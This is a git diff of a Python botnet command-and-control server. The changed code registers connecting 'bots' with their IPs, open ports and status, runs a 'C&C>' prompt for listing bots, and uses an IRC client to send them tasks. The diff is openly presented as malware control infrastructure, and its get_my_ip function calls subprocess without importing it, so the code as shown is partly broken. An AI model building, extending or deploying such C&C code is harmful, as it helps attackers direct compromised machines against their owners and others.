@@ -1,5 +1,29 @@
 import socket
 from irc_client import irc_client_program
+import config
+from threading import Thread
+BOTS = {}
+THREADS = []
+
+def pprint_help():
+    print("commands:")
+    print("\t dump, \t returns a list of the active bots")
+    print("\t irc, \t connect to a bot and send him tasks to perform")
+    print("\t exit, \t exits")
+    return
+
+def dump():
+    print("\t------ ACTIVE BOTS ------")
+    for k in BOTS:
+        print(f"\t {k} -> {BOTS[k]['status']}")
+    return 
+
+def get_my_ip():
+    cmd = ['hostname', '-I']
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    o, e = proc.communicate()
+    my_ip = o.decode('ascii')
+    return my_ip[:-1]
 
 def get_host_info(conn):
     # get info on ip
@@ -20,13 +44,33 @@ def get_host_info(conn):
 
     return ip, ss
 
-def server_program():
-    # get the hostname
-    host = "10.0.0.1"
-    port = 4444  # initiate port no above 1024
-    clients = 2
+def stop_cc():
+    print("killing C&C")
+    tmp_sock = socket.socket()
+    tmp_sock.connect((config.server_info["ip"], config.server_info["port"]))
+    return 
 
-    bot_infos = {}
+def cc_cli():
+
+    while True:
+        action = input("C&C>").lower()
+        match action:
+            case "irc":
+                irc_client_program()
+            case "dump":
+                dump()
+            case "exit":
+                break
+            case _:
+                pprint_help()
+    stop_cc()
+    return
+
+def handle_bot_connection():
+    # get the hostname
+    host = config.server_info["ip"]
+    port = config.server_info["port"]
+    clients = 2
 
     server_socket = socket.socket()  # get instance
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -35,32 +79,27 @@ def server_program():
 
     # configure how many client the server can listen simultaneously
     server_socket.listen(clients)
-    print(f"server listening ({host}, {port})")
-
-    conn, address = server_socket.accept()  # accept new connection
-    print("Connection from: " + str(address))
-    
-    host_ip, host_ports = get_host_info(conn)
-    bot_infos[str(address)] = (host_ip, host_ports)
-    print(f"Got info about {str(address)}: \nip: \n\t{host_ip} \nopen ports: \n\t{host_ports}")
-    
+    print(f"C&C listening on {host}:{port}")
     while True:
-        action = input("Connect to bot using IRC ('irc'), exit ('exit'): ")
-        if action.lower() == "irc":
-            irc_client_program()
-        elif action == 'exit':
+        conn, address = server_socket.accept()  # accept new connection
+        # print('Connected to :', address[0], ':', address[1])
+        if address[0] == config.server_info["ip"]:
             break
-    # while True:
-    #     # receive data stream. it won't accept data packet greater than 1024 bytes
-    #     data = conn.recv(1024).decode()
-    #     if not data:
-    #         # if data is not received break
-    #         break
-    #     print("from connected user: " + str(data))
-    #     data = input(' -> ')
-    #     conn.send(data.encode())  # send data to the client
+        host_ip, host_ports = get_host_info(conn)
+        BOTS[str(host_ip)] = {"info_ports": host_ports, "status": "idle"}
+        # print(f"[+] New bot connected:\n\t got info about {str(address)}: \nip: \n\t{host_ip} \nopen ports: \n\t{host_ports}")
+        conn.close()
+    server_socket.close()
+    return
 
-    conn.close()  # close the connection
+def server_program():
+    
+    thread_connections = Thread(target=handle_bot_connection)
+    thread_connections.start()
+
+    thread_cc_cli = Thread(target=cc_cli)
+    thread_cc_cli.start()
+
 
 
 if __name__ == '__main__':
